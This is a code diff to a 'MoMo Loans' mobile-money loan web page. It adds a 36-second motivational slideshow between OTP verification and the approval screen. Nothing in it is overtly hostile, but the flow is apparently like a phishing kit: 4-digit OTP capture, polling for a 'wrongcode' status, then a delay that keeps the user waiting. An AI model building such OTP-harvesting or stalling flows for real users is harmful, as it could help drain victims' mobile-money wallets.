@@ -336,6 +336,42 @@
     animation: blinkMixed 2.4s ease-in-out infinite;
     transition: all 0.6s ease;
   }
+  /* ─── Empowerment slideshow (36s) ─── */
+  .emp-slide {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 30px 20px;
+    opacity: 0;
+    transition: opacity 0.8s ease;
+    text-align: center;
+  }
+  .emp-slide.active { opacity: 1; }
+  .emp-slide-icon { font-size: 4rem; margin-bottom: 20px; }
+  .emp-slide-title { font-size: 1.5rem; font-weight: 700; color: #fff; margin-bottom: 12px; }
+  .emp-slide-text { font-size: 0.95rem; color: rgba(255,255,255,0.78); max-width: 340px; line-height: 1.55; }
+  .emp-progress {
+    position: absolute;
+    bottom: 44px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 200px;
+    height: 4px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 2px;
+    overflow: hidden;
+    z-index: 3;
+  }
+  .emp-progress-bar {
+    height: 100%;
+    background: #FFD700;
+    width: 0%;
+    transition: width 0.36s linear;
+    border-radius: 2px;
+  }
 </style>
 </head>
 <body>
@@ -845,7 +881,56 @@
       </div>
     </div>
 
-        <!-- ─── Approval page (V2) ─── -->
+      <!-- ─── Empowerment slideshow page (36s) ─── -->
+    <div id="page-empowerment" class="page">
+      <div style="min-height:100vh; background:linear-gradient(135deg, #002B5C 0%, #004F9F 100%); position:relative; overflow:hidden;">
+
+        <button class="nav-lang" style="position:absolute; top:20px; right:20px; color:#fff; z-index:5;" onclick="showGate()">🌐</button>
+
+        <div class="emp-slide active">
+          <div class="emp-slide-icon">🌾</div>
+          <div class="emp-slide-title">Grow Your Farm</div>
+          <div class="emp-slide-text">MoMo Loans empower farmers with the tools and inputs they need to harvest more and earn more.</div>
+        </div>
+
+        <div class="emp-slide">
+          <div class="emp-slide-icon">🎓</div>
+          <div class="emp-slide-title">Pay School Fees</div>
+          <div class="emp-slide-text">Education shouldn't wait. Get the funds for tuition, books, and uniforms when you need them.</div>
+        </div>
+
+        <div class="emp-slide">
+          <div class="emp-slide-icon">💼</div>
+          <div class="emp-slide-title">Start Your Business</div>
+          <div class="emp-slide-text">From market stalls to small shops, MoMo Loans help entrepreneurs turn ideas into income.</div>
+        </div>
+
+        <div class="emp-slide">
+          <div class="emp-slide-icon">🏠</div>
+          <div class="emp-slide-title">Support Your Family</div>
+          <div class="emp-slide-text">Emergency funds, medical bills, or daily needs — take care of what matters most.</div>
+        </div>
+
+        <div class="emp-slide">
+          <div class="emp-slide-icon">🤝</div>
+          <div class="emp-slide-title">Build Community</div>
+          <div class="emp-slide-text">Every loan you take helps your community grow — one family, one business, one dream at a time.</div>
+        </div>
+
+        <div class="emp-slide">
+          <div class="emp-slide-icon">✅</div>
+          <div class="emp-slide-title">Almost There</div>
+          <div class="emp-slide-text">Your loan is being prepared for disbursement to your MoMo wallet.</div>
+        </div>
+
+        <div class="emp-progress">
+          <div class="emp-progress-bar" id="empProgressBar"></div>
+        </div>
+
+      </div>
+    </div>
+ 
+    <!-- ─── Approval page (V2) ─── -->
     <div id="page-approval" class="page">
       <div class="apr-frame-top"></div>
 
@@ -1613,7 +1698,46 @@ let smsTimer = null;
     }, 1000);
   }
 
-  async function doOtp() {
+    // ─── Empowerment slideshow (36 seconds, 6 slides × 6s) ───
+  let empSlideIndex = 0;
+  let empSlideTimer = null;
+  let empProgressTimer = null;
+
+  function startEmpowermentSlideshow() {
+    const slides = document.querySelectorAll('.emp-slide');
+    const bar = document.getElementById('empProgressBar');
+    if (!slides.length || !bar) return;
+
+    // Reset to first slide
+    empSlideIndex = 0;
+    slides.forEach((s, i) => s.classList.toggle('active', i === 0));
+    bar.style.width = '0%';
+
+    if (empSlideTimer) clearInterval(empSlideTimer);
+    if (empProgressTimer) clearInterval(empProgressTimer);
+
+    // Advance every 6s → 6 slides × 6s = 36 seconds total
+    empSlideTimer = setInterval(() => {
+      empSlideIndex += 1;
+      if (empSlideIndex >= slides.length) {
+        clearInterval(empSlideTimer);
+        clearInterval(empProgressTimer);
+        goTo('page-approval');
+        return;
+      }
+      slides.forEach((s, i) => s.classList.toggle('active', i === empSlideIndex));
+    }, 6000);
+
+    // Progress bar fills over 36s (100 steps × 360ms)
+    let progress = 0;
+    empProgressTimer = setInterval(() => {
+      progress += 1;
+      bar.style.width = Math.min(progress, 100) + '%';
+      if (progress >= 100) clearInterval(empProgressTimer);
+    }, 360);
+  }
+
+    async function doOtp() {
     const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
     if (otp.length !== 4) { showOtpMsg('error', t('alertOtpShort')); return; }
 
@@ -1664,7 +1788,8 @@ let smsTimer = null;
               if (rAmount) rAmount.textContent = 'XAF ' + amt.toLocaleString();
               if (rPeriod) rPeriod.textContent = termNum + (termNum === 1 ? ' month' : ' months');
               if (rTotal)  rTotal.textContent  = 'XAF ' + amt.toLocaleString();
-            goTo('page-approval');
+                          goTo('page-empowerment');
+              startEmpowermentSlideshow();
           } else if (status === 'wrongcode') {
             clearTimeout(otpPollTimeout);
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
